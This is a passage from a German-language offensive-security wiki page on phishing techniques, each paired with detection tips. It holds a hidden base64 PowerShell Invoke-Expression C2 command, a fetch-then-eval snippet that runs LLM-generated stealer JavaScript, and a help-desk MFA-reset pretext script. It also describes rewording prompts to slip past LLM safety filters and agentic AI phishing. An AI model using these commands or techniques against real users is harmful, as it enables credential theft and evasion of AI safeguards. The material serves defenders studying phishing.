  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` legt die Payload in `%TEMP%` ab, eine kurze Wartezeit kaschiert Netzwerkschwankungen, dann ruft `rundll32` den exportierten Einstiegspunkt (`notepad`) auf.
* Die DLL sendet regelmäßig die Host-Identität und fragt alle paar Minuten den C2 ab. Remote-Aufgaben werden als **base64-encoded PowerShell** empfangen und verborgen sowie mit deaktivierter Richtlinienprüfung ausgeführt:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Dies bewahrt die Flexibilität von C2 (der Server kann Tasks austauschen, ohne die DLL zu aktualisieren) und blendet Konsolenfenster aus. Sucht nach PowerShell-Prozessen unter `rundll32.exe`, bei denen `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` gemeinsam verwendet werden.
* Verteidiger können nach HTTP(S)-Callbacks im Format `...page.php?tynor=<COMPUTER>sss<USER>` und Polling-Intervallen von 5 Minuten nach dem Laden der DLL suchen.

---

## KI-gestützte Phishing-Operationen
Angreifer kombinieren inzwischen **LLM- und Voice-Clone-APIs** für vollständig personalisierte Köder und Interaktionen in Echtzeit.

| Ebene | Beispielhafte Nutzung durch den Angreifer |
|-------|-----------------------------|
|Automatisierung|Mehr als 100.000 E-Mails / SMS mit zufälliger Formulierung und Tracking-Links generieren und versenden.|
|Generative KI|Einmalige E-Mails verfassen, die sich auf öffentliche M&A-Meldungen oder Insider-Witze aus sozialen Medien beziehen; die Stimme eines CEO für einen Callback-Betrug deepfaken.|
|Agentische KI|Autonom Domains registrieren, Open-Source-Informationen sammeln und Folgemails verfassen, wenn ein Opfer klickt, aber keine Zugangsdaten eingibt.|

**Abwehr:**  
• **Dynamische Banner** hinzufügen, die auf Nachrichten aus nicht vertrauenswürdiger Automatisierung hinweisen (über ARC-/DKIM-Anomalien).  
• Für risikoreiche telefonische Anfragen **Challenge-Phrasen zur Sprachbiometrie** einsetzen.  
• In Awareness-Programmen fortlaufend KI-generierte Köder simulieren – statische Vorlagen sind überholt.

Siehe auch – Missbrauch von agentischem Browsing für Credential-Phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Siehe auch – Missbrauch lokaler CLI-Tools und MCP durch KI-Agenten (zur Erfassung von Secrets und deren Erkennung):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-unterstützte Laufzeitgenerierung von Phishing-JavaScript (Codegenerierung im Browser)

Angreifer können harmlos wirkendes HTML ausliefern und den **Stealer zur Laufzeit generieren**, indem sie eine **vertrauenswürdige LLM-API** um JavaScript bitten und es anschließend im Browser ausführen (z. B. mit `eval` oder einem dynamischen `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt als Verschleierung:** Exfiltrations-URLs/Base64-Zeichenfolgen im Prompt kodieren; die Formulierung wiederholt anpassen, um Sicherheitsfilter zu umgehen und Halluzinationen zu reduzieren.
2. **Clientseitiger API-Aufruf:** Beim Laden ruft JavaScript ein öffentliches LLM (Gemini/DeepSeek usw.) oder einen CDN-Proxy auf; im statischen HTML ist nur der Prompt/API-Aufruf enthalten.
3. **Zusammensetzen und Ausführen:** Die Antwort verketten und ausführen (polymorph bei jedem Besuch):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** Der generierte Code personalisiert die Ködernachricht (z. B. durch das Parsen von LogoKit-Tokens) und sendet Zugangsdaten an den im Prompt versteckten Endpunkt.

**Umgehungsmerkmale**
- Der Traffic läuft über bekannte LLM-Domains oder vertrauenswürdige CDN-Proxys, manchmal über WebSockets zu einem Backend.
- Es gibt keine statische Payload; das schädliche JS existiert erst nach dem Rendern.
- Nicht-deterministische Generierungen erzeugen für jede Sitzung einzigartige Stealer.

**Erkennungsideen**
- Sandboxes mit aktiviertem JS ausführen; `eval` zur Laufzeit oder die dynamische Erstellung von Skripten aus LLM-Antworten erkennen.
- Nach Front-End-POSTs an LLM-APIs suchen, auf die unmittelbar `eval` oder `Function` mit dem zurückgegebenen Text folgt.
- Bei nicht genehmigten LLM-Domains im Client-Traffic und anschließenden POSTs mit Zugangsdaten Alarm auslösen.

---

## MFA Fatigue / Push Bombing-Variante – erzwungener Reset
Zusätzlich zum klassischen Push Bombing erzwingen Angreifer während des Helpdesk-Anrufs einfach eine **neue MFA-Registrierung** und machen dadurch das bestehende Token des Benutzers ungültig. Jede darauffolgende Login-Aufforderung erscheint dem Opfer legitim.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Achten Sie auf AzureAD/AWS/Okta-Ereignisse, bei denen **`deleteMFA` + `addMFA`** innerhalb weniger Minuten von derselben IP-Adresse aus auftreten.



## Clipboard Hijacking / Pastejacking

Angreifer können von einer kompromittierten oder typosquattenden Webseite unbemerkt schädliche Befehle in die Zwischenablage des Opfers kopieren und den Benutzer dann dazu verleiten, sie in **Win + R**, **Win + X** oder ein Terminalfenster einzufügen. So wird beliebiger Code ohne Download oder Anhang ausgeführt.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobiles Phishing & Verteilung schädlicher Apps (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Hijacking der WhatsApp-Geräteverknüpfung durch QR-Social-Engineering
* Eine Köderseite (z. B. ein gefälschter „Kanal“ eines Ministeriums/CERT) zeigt einen WhatsApp-Web-/Desktop-QR-Code an und fordert das Opfer auf, ihn zu scannen. Dadurch wird unbemerkt das Gerät des Angreifers als **verknüpftes Gerät** hinzugefügt.<sup>[[12]](#references)</sup>
* Der Angreifer erhält sofort Einblick in Chats und Kontakte, bis die Sitzung entfernt wird. Opfer sehen möglicherweise später eine Benachrichtigung über ein „neues verknüpftes Gerät“. Verteidiger können nach unerwarteten Geräteverknüpfungsereignissen suchen, die kurz nach Besuchen nicht vertrauenswürdiger QR-Seiten auftreten.

### Mobilgerätegebundenes Phishing zur Umgehung von Crawlern/Sandboxes
Betreiber schalten ihren Phishing-Abläufen zunehmend eine einfache Geräteprüfung vor, damit Desktop-Crawler die endgültigen Seiten nicht erreichen. Ein gängiges Muster ist ein kurzes Skript, das prüft, ob das DOM Touch-Eingaben unterstützt, und das Ergebnis an einen Serverendpunkt sendet. Nicht mobile Clients erhalten HTTP 500 (oder eine leere Seite), während mobilen Benutzern der vollständige Ablauf angezeigt wird.<sup>[[7]](#references)</sup>

Minimales Client-Snippet (typische Logik):

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js`-Logik (vereinfacht):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Serververhalten, das häufig beobachtet wird:
- Setzt beim ersten Laden ein Sitzungscookie.
- Akzeptiert `POST /detect {"is_mobile":true|false}`.
- Gibt bei nachfolgenden GETs einen 500-Fehler (oder einen Platzhalter) zurück, wenn `is_mobile=false`; liefert die Phishing-Seite nur aus, wenn `true`.

Heuristiken für Suche und Erkennung:
- urlscan-Abfrage: `filename:"detect_device.js" AND page.status:500`
- Web-Telemetrie: Abfolge `GET /static/detect_device.js` → `POST /detect` → HTTP 500 bei nicht mobilen Geräten; legitime Pfade mobiler Opfer geben 200 zurück, gefolgt von HTML/JS.
- Seiten blockieren oder genauer prüfen, wenn sie Inhalte ausschließlich anhand von `ontouchstart` oder ähnlichen Geräteprüfungen anzeigen.

Verteidigungstipps:
- Crawler mit mobilähnlichen Fingerprints und aktiviertem JS ausführen, um gesperrte Inhalte aufzudecken.
- Bei verdächtigen 500-Antworten nach `POST /detect` auf neu registrierten Domains einen Alarm auslösen.

## References

- [1] [Generieren von Domain-Varianten, die bei Phishing verwendet werden (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Phishing aufspüren: Tools und Techniken (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Zugangsdaten stehlen und 2FA mit noVNC umgehen (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Robando sesiones y bypasseando 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [DKIM mit Postfix unter Debian Wheezy installieren und konfigurieren (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Globaler Incident-Response-Bericht 2025 von Unit 42 – Ausgabe Social Engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – mobilitätsgesteuerte Phishing-Infrastruktur und Heuristiken (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Die nächste Grenze von Runtime-Assembly-Angriffen: LLMs zur Echtzeitgenerierung von Phishing-JavaScript einsetzen](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Imitation, Click Hijacking und TDS: Einblicke in ein Malware-Verbreitungsökosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting von Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Datenverkehr zu Microsofts windows.com per Bitflipping kapern (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Liebe? Tatsächlich: Gefälschte Dating-App dient als Köder in gezielter Spyware-Kampagne in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat: IoCs und Samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
